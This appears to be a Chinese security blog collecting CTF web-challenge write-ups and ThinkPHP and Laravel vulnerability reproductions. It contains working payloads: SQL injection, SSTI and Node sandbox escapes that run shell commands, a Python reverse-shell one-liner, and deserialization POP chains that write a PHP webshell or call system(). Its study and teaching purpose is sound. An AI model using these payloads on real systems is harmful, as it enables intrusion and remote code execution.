Subqueries，在mysql中，字符串的比较是按照字典序来比的即&#39;g&#39;&gt;&#39;fzz&#39;，所以以下表达式成立 1((1,&apos;g&apos;)&gt;(select * from f1ag_1s_h3r3_hhhhh)) 可以按照这样的思路去爆破，不过爆破出来的结果需要减去1。 [N1CTF 2018]eating_cms注册一个账号登录进去发现可以用伪协议读源码，发现使用parseurl提取处数据过滤 123$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);parse_str($uri[&apos;query&apos;], $query); parse_url在碰到格式错误的url时，会返回False,所以我们构造 1http://ip:port//user.php?page=php://filter/convert.base64-encode/resource=m4aaannngggeee 就可以绕过过滤，直接包含文件，发现一个templates/upload.html，访问一下，是一个文件上传的点，发现了一个文件upllloadddd.php，上传文件发现这个文件好像并不在当前目录下，使用伪协议读取源码，发现upload在templates的前一级目录。 1php://filter/convert.base64-encode/resource=upllloadddd 所以我们只能使用文件包含m4aaannngggeee来上传文件，通过读取源码发现，filename并不存在过滤，所以直接使用filename进行命令执行（PS:文件路径会在/处截断），所以我们不能使用/。 1filename=&quot;glag;cd ..;ls;cat flag_233333 ;#&quot; [RoarCTF 2019]Online Proxy抓包看见了IP地址，XFF可以伪造，会输出当前IP地址与上次的IP地址，当当前IP地址不变时，上次的IP也不会变，感觉应该是储存型SQL注入，后台逻辑应该是前两次输入时，存入数据库，按照输入顺序输出输入变量，当两次输入后，就从数据库读取IP数据，这就造成了注入。 将Payload存入Current Ip 再次输入变成Last Ip 再次输入同样的值，就触发了储存型sql注入，而且没有WAF。 这题的flag存在别的数据库中，所以我们先要爆破一下数据库，然后再一套流程下来，拿到flag。 在最后查flag时，由于是跨库操作，需要指定数据库名，不然会找不到表数据库名.表名。 [GKCTF2020]EZ三剑客-EzNode查看源码，发现使用了safer-eval库，版本是1.3.6，safer-eval通过vm模块做沙箱环境执行代码，隔离代码的上下文环境，也就是说沙箱内部无法访问外部非global变量，但是外部可以访问到沙箱内部变量。 刚说到可以使用全局变量，我们就可以通过process全局对象的mainModule属性来获取当前Module，然后加载child_process子进程模块，该模块中有许多命令执行的方法比如execSync。 safer-eval对会对vm沙箱中的变量值进行过滤，如果碰到global变量就将它赋值为undefined，process显然在其中，那怎么办呢，变量中不能直接有process，我们还可以使用构造函数Function(“return process”);这样也能返回process的值，但是Function也在黑名单中，通过观察safer-eval的源码，我们可以发现safer-eval在沙箱的上下文中添加了6个可使用函数 1&apos;clearImmediate&apos;,&apos;clearInterval&apos;,&apos;clearTimeout&apos;,&apos;setImmediate&apos;,&apos;setInterval&apos;,&apos;setTimeout&apos; 所以我们可以使用clearImmediate.constructor来获得Function。 1const a=clearImmediate.constructor(&quot;return process;&quot;)(); 构造函数并执行返回process。 但是即使一个函数都没有，也可以这样构造(PS:可以自己去试试) 1const a=&apos;&apos;.constructor.constructor(&quot;return process;&quot;)(); 既然有了process，那一切都好办了 通过process.mainModule获得当前模块可以用当前模块调用require，引入child_process模块，在child_process模块中有许多命令执行的函数能够使用，最后，由于题目显示的是返回值，所以我们需要以函数返回的形式返回命令执行结果。最终的payload 1(function()&#123;const a=clearImmediate.constructor(&quot;return process;&quot;)(); return a.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();&#125;)() [网鼎杯 2020 玄武组]SSRFMe一道SSRF，将内网地址都过滤了，在此处有三种方式绕过。 利用Curl与Parseurl解析的不同绕过，在我的另一篇SSRF学习中有提到。 利用DNS重绑定漏洞，同上。 0.0.0.0未被过滤，0.0.0.0的IP地址表示整个网络 但是在BUU上，只能使用第三种方式绕过(无法访问外网)。 1payload:/?url=http://0.0.0.0/hint.php 得到Redis密码。 那就直接用gopher写WebShell咯，具体也在我的SSRF文章中有写到，当然在BUU上可以开一个linux靶机，主从复制也是可以的。 [HarekazeCTF2019]encode_and_encode使用json_decode获取数据，查看官方手册。 支持UTF-8编码，那就是支持unicode，直接unicode编码绕过WAF，使用php伪协议读取flag。 1&#123;&quot;\\u0070\\u0061\\u0067\\u0065&quot;:&quot;\\u0070\\u0068\\u0070\\u003a\\u002f\\u002f\\u0066\\u0069\\u006c\\u0074\\u0065\\u0072\\u002f\\u0072\\u0065\\u0061\\u0064\\u003d\\u0063\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u002e\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0065\\u002f\\u0072\\u0065\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065\\u003d\\u002f\\u0066\\u006c\\u0061\\u0067&quot;&#125; [BJDCTF2020]EzPHP源码发现一段base32加密的字符，解密进入1nD3x.php。 第一关：绕过$_SERVER[‘QUERY_STRING’] 由于$_SERVER[‘QUERY_STRING’]不会urldecode，所以将上传的参数urlencode一次即可绕过。 第二关：绕过$正则匹配 $在单行查询下不会进行匹配换行符，%0a换号符绕过。 第三关：绕过$_REQUEST 翻阅PHP手册，发现$_REQUEST数组获得值得顺序按照php.ini中的variables_order配置。 在默认情况下variables_order得值是 EGPCS (Environment, Get, Post, Cookie, and Server)，首先获得GET中的值，然后再获取POST中得值，这里就导致了变量覆盖，所以用POST方法上传参数将GET的参数覆盖即可绕过。 第四关：绕过file_get_contents($file) 使用data协议 第五关：md5绝对比较 使用数组绕过。 第六关：命令执行$code(&#39;&#39;, $arg);形式 关键点在于： 使用create_function绕过，由于create_function基于eval实现，可以进行拼接绕过 PHP 自动将裸字符串（没有引号的字符串且不对应于任何已知符号）转换成一个其值为该裸字符串的正常字符串。 fopen,fget未被过滤 define函数可以定义常量，get_defined_vars() 1&#125;define(a,fopen(base64_decode(cmVhMWZsNGcucGhw),r));while(!feof(a))var_dump(fgets(a));fclose(a);// urlencode即可得到flag。 [SWPUCTF 2018]SimplePHPfile.php可以读源码，首先将源码读取一遍（file.php,upload_file.php,class.php,function.php）。 图片限制后缀.jpg，非常明显一道phar反序列化，触发点在file.php的is_file()函数，链子也很简单。 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct() &#123; $this-&gt;str = new Show(); &#125;&#125;class Show&#123; public $source; public $str; public function __construct() &#123; $this-&gt;str[&apos;str&apos;]=new Test(); echo $this-&gt;source; &#125;&#125;class Test&#123; public $params; public function __construct() &#123; $this-&gt;params[&apos;source&apos;]=&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/f1ag.php&quot;; &#125;&#125;$a=new C1e4r();echo serialize($a);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头用以欺骗检测$phar-&gt;setMetadata($a); //将自定义meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件$phar-&gt;stopBuffering(); 改名为1.jpg，上传，可以在function处发现文件命名规则。 在file处输入phar:///var/www/html/upload/文件名，即可得到flag。 [强网杯 2019]Upload在www.tar.gz发现源码,是一道反序列化，链子比较简单，通过Register类的__destruct方法调用Profile类的update_img方法，在此处修改文件名即可。 12345if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=\"../upload/$this-&gt;upload_menu/$this-&gt;filename\"; $this-&gt;update_img(); poc如下 1234567891011121314151617181920212223242526272829303132333435&lt;?phpnamespace app\\web\\controller;class Register&#123; public $checker; public $registed; public function __construct() &#123; $this-&gt;checker=new Profile(); $this-&gt;registed=false; &#125;&#125;class Profile&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __construct() &#123; $this-&gt;except['index']=\"img\"; $this-&gt;img=\"upload_img\"; $this-&gt;ext=1; $this-&gt;checker=0; $this-&gt;filename_tmp=\"./upload/04b0951938d905b41348c1548f9c338b/356f6894f245b0f1a97f01f1d6d4744a.png\"; $this-&gt;filename=\"./upload/04b0951938d905b41348c1548f9c338b/eval.php\"; &#125;&#125;$a=new Register();echo base64_encode(serialize($a)); [NCTF2019]SQLi一道sql注入，robots.txt中有提示，得到passwd就会输出flag，fuzz一下，发现过滤了单引号等字符，单引号能用反斜杠转义，空格用/**/代替，regexp未被过滤，所以可以使用正则注入 1username=1\\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^y&quot;;%00 逐位爆破即可得到密码，输入密码得到flag。 [HFCTF2020]JustEscape题目说真的是php吗，在nodejs中也有eval函数，随便输入一个node命令Error().stack，打印Error被实例化的位置，可以发现Error被实例化在沙箱外，所以就是利用Error报错来沙箱逃逸了。 大佬的文章：https://www.anquanke.com/post/id/207291 github上也有关于Error报错利用的payloadhttps://github.com/patriksimek/vm2/issues/225 改题目还过滤了许多关键字，但是我们可以通过字符串拼接绕过。 12`$&#123;`$&#123;`prototy`&#125;pe`&#125;`=prototype //变量拼接[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)join方法数组拼接 1234567891011(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat flag`)[`toString`](); &#125; &#125;)()////(function()&#123;TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();try&#123;Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;&#125;catch(e)&#123;return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();&#125;&#125;)()(function ()&#123; TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)(); try&#123; Object.preventExtensions(Buffer.from(``)).a = 1; &#125;catch(e)&#123; return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`whoami`).toString(); &#125;&#125;)() [网鼎杯2018]Unfinish一道二次注入 10&apos;+(select hex(hex(database())))+&apos;0 使用两次hex的原因是如果hex编码之后有字母，就会被截断，经过两次hex编码后，可以转换为纯数字，与0相加还得原数，每次爆10位，多了会自动转换为科学计数法。 10&apos;+(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))+&apos;0 [CSCCTF 2019 Qual]FlaskLightflaskssti，过滤了__globals__关键字，调用__getattribute__base64编码绕过，读取flag。 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(%27X19nbG9iYWxzX18=%27.decode(%27base64%27))[%27__builtins__%27][%27eval%27](%27__import__(&quot;os&quot;).popen(&quot;cd%20/flasklight;%20cat%20coomme_geeeett_youur_flek&quot;).read()%27)&#125;&#125; [网鼎杯 2020 白虎组]PicDown这题直接../../../../../flag就读到了，应该是非预期，权限没设置好，预期解走一遍。 ../../../../proc/self/cmdline读取到app.py，在linux下，打开文件，如果没有关闭，便会在/proc/[pid]/fd/innode处保存原文件，因为/proc/self代表当前进程，所以我们只需要爆破一下innode，得到secretfile 1hxk6hdQZnALSCYt/cqdPADFK9W7KC6VEJmax+uK8Bf8= 执行命令没有回显，弹shell 1python3 -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos; 读取flag [GYCTF2020]EasyThinkingthinkphp6.0任意文件上传漏洞，首先将sessionId改为任意长32、以php结尾的字符aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php，上传后在/runtime/session文件夹中，AntSword连接 1/runtime/session/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php 发现有disable_function直接AntSword UAF绕过，的到flag。 [WUSTCTF2020]CV Makeremm，网站做的挺好的，登陆进去一个文件上传，修改一下Content-Type和加一个GIF89a的头就上传了，直接执行system(‘cat /Flag_aqi2282u922oiji’); [b01lers2020]Welcome to Earthemm，直接进入最后一关/fight，自己拼一下flag就出来了","categories":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/categories/writeup/"}],"tags":[]},{"title":"TP5.0.24","slug":"TP5.0.24漏洞复现合集","date":"2020-09-29T16:00:00.000Z","updated":"2020-11-27T11:34:04.375Z","comments":true,"path":"2020/09/30/TP5.0.24漏洞复现合集/","link":"","permalink":"http://yoursite.com/2020/09/30/TP5.0.24漏洞复现合集/","excerpt":"","text":"TP漏洞复现合集前言该文章是各种TP漏洞复现的合集，刚开始复现的小伙伴最好先看看开发手册，仔细了解一下框架结构，能够使你更快入手。 TP5.0.15SQL注入复现环境配置使用composer安装TP5.0.15 composer能够更加方便、快速的安装准确的框架版本，windows环境在官网下载安装程序，选择PHP版本(最好是大于7.2)，安装时可以配置一下代理，不然会很慢。 安装好后执行 composer create-project topthink/think tp 5.0.15更多的版本也可以在composer官网找到。 使用composer的好处是能够快速切换版本，只需要将framework改成你自己想要的版本，然后执行composer update就好了。 数据库配置首先建立一个数据库tptest，然后建立一个user表，字段是id,username。 影响范围ThinkPHP 5.0.13~ThinkPHP 5.0.15 漏洞复现漏洞触发点在执行数据插入的时候，所以先在index控制器创建一个插入数据的方法。 12345public function testsql() &#123; $username = input(&apos;get.username/a&apos;); db(&apos;user&apos;)-&gt;where([&apos;id&apos;=&gt; 1])-&gt;insert([&apos;username&apos;=&gt;$username]); &#125; 访问 1http://localhost/public/index.php/index/index/testsql?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 报错注入成功。 漏洞分析跟入insert方法，重点在生成sql语句的函数 跟入$this-&gt;builder-&gt;insert方法 跟进parseData方法，看看它是如何处理我们的数据。 12345678910111213141516171819 foreach ($data as $key =&gt; $val) &#123; $item = $this-&gt;parseKey($key, $options); if (is_object($val) &amp;&amp; method_exists($val, '__toString')) &#123; // 对象数据写入 $val = $val-&gt;__toString(); &#125;elseif (is_array($val) &amp;&amp; !empty($val)) &#123; switch ($val[0]) &#123; case 'exp': $result[$item] = $val[1]; break; case 'inc': $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]); break; case 'dec': $result[$item] = $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]); break; &#125; &#125; 可以在用户手册看到说明，在thinkphp5.0.5加入了exp、inc、dec方法来处理数据，主要是为了方便字段的自增与自减，这里就是漏洞触发点。 由于没有对数据做任何过滤处理，处理完数据后，直接拼接成sql语句并执行，才导致报错注入的发生。 1INSERT INTO `user` (`username`) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)+1) 我们可以注意到，与inc效果类似的关键字还有exp与dec，于是我们试一试这两个关键字能不能触发。 1http://localhost/public/index.php/index/index/testsql?username[0]=dec&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 dec关键字触发漏洞成功，但是exp关键字触发漏洞失败了。 1http://localhost/public/index.php/index/index/testsql?username[0]=exp&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 经过调试，发现thinkphp对输入的数据进行了过滤，exp排在黑名单榜首。 在exp后加了一个空格，导致case判断失败。 但是该SQL注入无法执行多句，所以比较鸡肋。 TP5.0.*任意代码执行&amp;任意文件写入漏洞复现环境配置本次以TP5.0.0版本作为复现版本。 1composer create-project topthink/think tp 5.0.0 按照之前的方法，将composer.json中的版本信息修改为5.0.0。 影响范围ThinkPHP 5.0.0 ~ ThinkPHP 5.0.23 漏洞复现搭建好服务，并发送如下请求 filter中为你想执行的函数，s(任意变量名都行)为参数，即可实现任意代码执行。 漏洞分析TP5.0.*支持请求伪装，在获取路由时，使用think\\Requests类的method方法实现。 123if (isset($_POST[Config::get('var_method')])) &#123; $this-&gt;method = strtoupper($_POST[Config::get('var_method')]); $this-&gt;&#123;$this-&gt;method&#125;($_POST); 可以看到，它在使用了可变函数，为的是调用类中的其他请求方法，比如get、post方法，实现请求伪装但是这也让我们可以任意调用该类中的函数。 我们可以发现，在该类的__construct方法中，由于$option参数可控，我们可以任意覆盖该类中的参数。 123if (property_exists($this, $name)) &#123; $this-&gt;$name = $item;&#125; 我们要覆盖的参数有两个 filter参数 filter定义在Requests类中，作为全局的过滤器，一般使用htmlspecialchars之类的函数过滤用户输入的参数，意思就是说会将挨次的将的GET、POST的所有数据作为该函数的参数执行一次，所以我们可以覆盖filter函数为我们想要执行的恶意函数system之类的。 method参数 在获取路由后，thinkphp会获取当前的路由规则 123$method = $request-&gt;method();// 获取当前请求类型的路由规则$rules = self::$rules[$method]; 当路由规则不在rules数组中，会产生报错，为了防止报错，我们可以将method设为上图中的任意值。 thinkphp在执行用户调用控制器的方法前会使用过滤器将全局参数过滤一遍，而这时，filter函数已经被我们改成了而已函数system。 12345678private function filterValue(&amp;$value, $key, $filters)&#123; $default = array_pop($filters); foreach ($filters as $filter) &#123; if (is_callable($filter)) &#123; // 调用函数或者方法过滤 $value = call_user_func($filter, $value); &#125; 我们可以看到，程序在这里使用is_callable检测函数是否可调用，然后用不断用call_user_func执行该函数，知道将用户输入的变量过滤完，这时我们的恶意代码system(‘whoami’)就成功被执行，这里还可以调用系统静态方法上传shell文件，具体看Nu1L easyTP5。 TP6.0session 任意文件创建&amp;删除漏洞复现环境配置1composer create-project topthink/think tp 6.0.0 下载好后，将composer.json中的数据修改成如下图所示 在app\\middleware.php中开启session功能 影响范围ThinkPHP 6.0.0~ThinkPHP 6.0.1 漏洞复现漏洞利用点是在session保存时，session文件名可控导致的任意文件创建。 在index控制器引入Session类并添加如下测试方法。 1234use think\\facade\\Session; public function session_test()&#123; Session::set('id','name');&#125; 访问http://localhost/public/index.php/index/session_test，可以看见在/runtime/session文件夹下根据sessionID创建了session文件，内容就是将session中的数据序列化。 修改sessionID为：aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php(长度为32位)，可以看到成功在\\runtime\\session文件夹下生成了一个php文件。 尝试一下目录穿越，/../../../public/aaaaaaaaaaa.php成功写入public文件夹中。 漏洞分析当执行Session::set方法时，会调用\\vendor\\topthink\\framework\\src\\think\\session\\Store.php中的setId方法 当传入的SessionId满足32位长度时，就将id设为SessionId，否则就重设SessionId。 之后进入save方法保存用户session。 123456789101112public function save(): void&#123; $this-&gt;clearFlashData(); $sessionId = $this-&gt;getId(); if (!empty($this-&gt;data)) &#123; $data = $this-&gt;serialize($this-&gt;data); $this-&gt;handler-&gt;write($sessionId, $data); &#125; else &#123; $this-&gt;handler-&gt;delete($sessionId); &#125; $this-&gt;init = false;&#125; 跟入write函数。 1234protected function writeFile($path, $content): bool&#123; return (bool) file_put_contents($path, $content, LOCK_EX);&#125; 它使用file_put_contents函数将sessionID作为文件名写入文件，所以可以通过目录穿越实现任意文件上传，利用条件是用户能够控制Session内容。 在执行save方法时，可以看到当session内容为空时。使用unlink删除文件，文件名控制方法与上面一样。 TP5.0.24 反序列化利用链分析环境搭建将composer.json修改为5.0.24版本，执行composer update 在application/index/controller中创建unserilize方法 123456public function unserilize()&#123; echo \"welcome\"; $input = input('get.input/s'); unserialize($input);&#125; 漏洞复现跟着大佬分析了一下链子https://www.anquanke.com/post/id/196364#h2-4。 exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpnamespace think\\process\\pipes;class Windows&#123; private $files = []; public function __construct()&#123; $this-&gt;files[0]=new \\think\\model\\Pivot(); &#125;&#125;namespace think\\model;use think\\Model;class Pivot &#123; protected $append = []; protected $updateWhere; protected $pk; public function __construct()&#123; $this-&gt;append[0]=\"getWhere\"; $this-&gt;pk=\"1\"; $this-&gt;updateWhere=new \\think\\model\\relation\\HasOne(); $this-&gt;parent=new \\think\\console\\Output(); &#125;&#125;namespace think\\model\\relation;class HasOne&#123; protected $query; protected $bindAttr = []; public function __construct()&#123; $this-&gt;query=new \\think\\db\\Query(); $this-&gt;bindAttr[0]=\"1\"; &#125;&#125;namespace think\\db;class Query&#123; protected $model; public function __construct()&#123; $this-&gt;model=new \\think\\console\\Output(); &#125;&#125;namespace think\\console;class Output&#123; protected $styles; private $handle; public function __construct()&#123; $this-&gt;styles=['getAttr']; $this-&gt;handle=new \\think\\session\\driver\\Memcache(); &#125;&#125;namespace think\\session\\driver;class Memcache&#123; protected $handler; public function __construct()&#123; $this-&gt;handler=new \\think\\cache\\driver\\File(); &#125;&#125;namespace think\\cache\\driver;class File&#123; protected $options; protected $tag; public function __construct()&#123; $this-&gt;options=['path'=&gt;'php://filter/write=string.rot13/resource=&lt;?cuc @riny($_CBFG[\"nn\"]);?&gt;','data_compress' =&gt; false,'cache_subdir' =&gt; false,'prefix' =&gt; false,'expire' =&gt; 0,'prefix' =&gt; '']; $this-&gt;tag=1; &#125;&#125;$a=new \\think\\process\\pipes\\Windows();echo urlencode(serialize($a)); 漏洞分析这条链子是利用php://filter绕过死亡exit;，写入shell，接下来具体分析一下整个链子和自己的一些体会，由于这是我复现的第一条反序列化利用链子，所以写的很详细。 首先全局搜索一下__destruct方法，发现在\\think\\process\\pipes\\Windows.php中存在一个file_exists能够触发__tostring 接着全局搜索一下__tostring，一个一个找，看有没有配合其他魔术方法(比如__call之类的)的点，发现在\\think\\Model.php中的__tostring方法存在一个可以调用__call（PS:找这种__call魔术方法的时候需要注意参数一定是要可控的）的点。 这里需要注意的是，由于Model类是一个抽象类，不能被反序列化，所以需要找一下他的子类来进行利用，这里我们使用think\\model\\Pivot类。 注意看我打断点的三处，可以注意到，代码从$this-&gt;relation数组中取到relation的值，然后调用$this-&gt;$relation()来获取modelRelation的值，所以首先我们在该类中找到一个返回值可控的方法，我找了一个getwhere方法。 可见，$where=$this-&gt;updateWhere，updateWhere刚好是我们可控的，但是想让他成功返回还需设置$this-&gt;pk，否则$pk取不到值会抛出异常，结束程序。控制modelrelation的主要目的还是为了控制$value，跟进getRelationData方法。 首先可以看到，这里的modelRelation必须是Relation抽象类的子类，而且在前面看到，modelRelation也必须要存在getBindAttr方法才能到达我们的利用点，全局搜索一下，发现只有\\think\\model\\relation\\OneToOne类满足这个要求，我们可以看到，OneToOne类任然是一个抽象类，所以需要通过它的子类来利用，这里我使用的是\\think\\model\\relation\\HasOne类。 说完了ModelRelation类的要求，回到这个if语句，第一个条件是我们的返回值(可控)，第二个条件可以使用$this-&gt;selfRelation=1来通过判断，第三个条件调用了getModel方法，跟入该方法。 这里调用了Query类的getModel方法，返回值是可控的，所以现在的问题是找到一个可以利用的__call方法，这个放在最后说，回到之前那张长图。 可以看到需要控制的还有$attr变量，它通过getBindAttr方法来获取，之前说过，该方法存在于OneToOne类中。 这里直接返回一个可控值，所以现在方法名和参数都可控，全局搜索一下__call方法，一共就十多个，由于我们不能控制方法名，所以目标主要放在调用自身方法的类上，不难发现\\think\\console\\Output类中的__call方法可以利用。 跟入block方法，它最终调用write方法，而$this-&gt;handle可控。这里的$message变量就是经过拼接的$args，不过该变量在后面没啥作用，随便设一个值即可。 那么我们继续找哪个类中的write方法能被利用，找了一圈，发现在\\think\\session\\driver\\Memcache类的write方法中使用$this-&gt;handle-&gt;set调用set方法，所以我们继续寻找可利用的set方法。 最终发现\\think\\cache\\driver\\File类中的set方法可以写入文件。 同样我也在关键地方打上了断点，首先跟入第一个断点，发现filename是可控的，它后面的拼接我们可以使用php伪协议来绕过。 在这里可以传入 1php://filter/write=string.rot13/resource=&lt;?cuc @riny($_CBFG[&quot;nn&quot;]);?&gt; 现在我们只是能够控制文件名，但是文件的内容我们却不能控制，继续跟入setTagItem方法。 可以发现，filename传入之后变成了value,并重新调用了一次set方法，这就意味着现在文件名和参数都可控了，那么第二次的file_put_contents就变成了 成功绕过exit，写入shell。 只不过这种方法不能再windows下利用，因为windows文件名不能含有尖括号。 TP6.0反序列化利用链分析环境配置环境用的是TP6.0，废话就不多说啦，怎么配前面都有了，首先在app\\controller\\index.php中创建反序列化方法。 123456public function unserilize()&#123; echo &quot;welcome&quot;; $input = input(&apos;get.input/s&apos;); unserialize($input);&#125; 漏洞复现exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpnamespace think\\model\\concern&#123; trait Attribute&#123; private $data=[&quot;name&quot;=&gt;&quot;whoami&quot;]; protected $strict = true; private $withAttr = [&quot;name&quot;=&gt;&quot;system&quot;]; protected $schema = [&quot;name&quot;=&gt;&quot;11&quot;]; &#125;&#125;namespace think &#123; abstract class Model &#123; use model\\concern\\Attribute; private $lazySave; protected $withEvent ; private $exists; protected $name; public function __construct($a=&apos;&apos;) &#123; $this-&gt;lazySave = true; $this-&gt;withEvent=false; $this-&gt;exists=true; $this-&gt;name=$a; &#125; &#125;&#125;namespace think\\Model&#123; use think\\Model; class Pivot extends Model&#123; &#125;&#125;namespace &#123; use think\\Model\\Pivot; $a=new Pivot(new Pivot()); echo urlencode(serialize($a));&#125; 漏洞分析反序列化一般都是以__destrct或__wakeup方法作为，TP6删除了windows类，所以我们需要找一个新的起点。 在vendor\\topthink\\think-orm\\src\\Model.php中的__destruct方法中，调用了save函数。 这里的Model类是一个抽象类，所以找全局一个子类即可，这里使用Pivoit类。 跟入updateData方法，程序在检查完数据后，调用了db()方法，继续跟进。 可以看到，这里存在字符串拼接$this-&gt;name.$this-&gt;suffix，这两个变量我们都可控，在这里我们可以触发__toString，在src\\model\\concern\\Conversion.php文件中，发现了__toString调用了toJson方法。 仔细看这个类发现是trait类，可以说是继承的扩展，允许一个类继承(use)多个trait，同样，它不能被序列化，所以只能找一个引用过它的类，恰巧，我们之前使用的Model类就引用了trait Conversion。 所以这里能控制$this-&gt;name为我们的Pivot类（注意：不要在__Construct方法中直接赋值，套娃警告！）。 继续跟进，toJson-&gt;toArray-&gt;getAttr-&gt;getValue 发现这里使用了可变函数，但是具有两个参数，刚好system函数是允许这种格式的输入的。 所以可以控制closure为system，value为我们想执行的命令，这里closure的值就是在$this-&gt;withAttr数组中取出，而fieldname的值可以控制为传入的name参数，先看value得值。 可以看到$value的值被第二个参数传入，所以回到getattr方法，发现value的值是从$this-&gt;data数组中取出来的，关键是name参数。 继续回退，name就是从$this-&gt;data中取出来的键值。 这里的$key就是作为name参数传入的，所以控制$withAttr[&#39;name&#39;]=system，再传入$data[&#39;name&#39;]=whoami即可成功控制$clouser和$value，成功命令执行。 Lavarel链子（混入奇怪的东西环境配置1composer create-project --prefer-dist laravel/laravel laravel58 漏洞复现分析了这么多反序列化链，说的也差不多了，就不分析了(懒狗，下面不带分析了，lavarel链子比较简单。 版本5.8.261234567891011121314151617181920212223242526&lt;?phpnamespace Symfony\\Component\\Cache\\Adapter;class TagAwareAdapter&#123; private $deferred; private $pool; public function __Construct()&#123; $this-&gt;deferred[\"0\"]=\"cat /flag\"; $this-&gt;pool=new \\Faker\\Generator(); &#125;&#125;namespace Faker;class Generator&#123; protected $formatters = array(); public function __Construct()&#123; $this-&gt;formatters[\"saveDeferred\"]=\"system\"; &#125;&#125;$a=new \\Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter();echo urlencode(serialize($a)); 版本7.29.31234567891011121314151617181920&lt;?phpnamespace Illuminate\\Broadcasting;class PendingBroadcast&#123; public $events; public $event; public function __Construct()&#123; $this-&gt;event=47; $this-&gt;events=new \\Faker\\Generator(); &#125;&#125;namespace Faker;class Generator&#123; protected $formatters = []; public function __Construct()&#123; $this-&gt;formatters[\"dispatch\"]=\"phpinfo\"; &#125;&#125;$a=new \\Illuminate\\Broadcasting\\PendingBroadcast();echo urlencode(serialize($a));","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://yoursite.com/categories/漏洞复现/"}],"tags":[]},{"title":"极客巅峰+月饼赛","slug":"极客巅峰","date":"2020-09-26T16:00:00.000Z","updated":"2020-09-28T08:05:42.807Z","comments":true,"path":"2020/09/27/极客巅峰/","link":"","permalink":"http://yoursite.com/2020/09/27/极客巅峰/","excerpt":"","text":"BABYPHP2www.zip源码泄露，审查源码发现文件上传和读取，可以构造phar反序列化。 链子还是比较简单的。 123456789101112131415161718192021222324252627282930313233343536&lt;?phpclass User&#123; public $nickname=null; public $backup; public function __construct()&#123; $this-&gt;nickname=new Reader(); $this-&gt;backup=\"/flag\"; &#125; public function __toString() &#123; $this-&gt;nickname-&gt;backup=$this-&gt;backup; $user = new User(); $user-&gt;id = $_SESSION['id']; $user-&gt;nickname = $_SESSION['token']; return serialize($user); &#125;&#125;class dbCtrl&#123; public $token; public function __construct() &#123; $this-&gt;token=new User(); &#125;&#125;Class Reader&#123;&#125;$a=new dbCtrl();$phar = new Phar(\"phar.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); 